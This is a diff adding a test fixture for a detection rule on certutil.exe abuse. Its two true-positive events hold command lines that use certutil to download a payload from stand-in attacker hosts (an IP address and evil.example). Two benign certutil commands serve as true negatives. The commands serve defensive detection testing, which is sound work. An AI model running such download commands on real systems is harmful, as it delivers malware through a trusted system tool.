@@ -1,0 +1,19 @@
+rule_id: 5f23f0aa-850c-44e8-a31d-7595ff0df60a
+true_positives:
+  - name: urlcache download
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.5/payload.exe C:\Users\Public\p.exe'
+  - name: slash-style verifyctl (windash)
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil /verifyctl -f -split https://evil.example/a.bin'
+true_negatives:
+  - name: certificate store listing
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -store My'
+  - name: urlcache cleanup without URL
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache * delete'
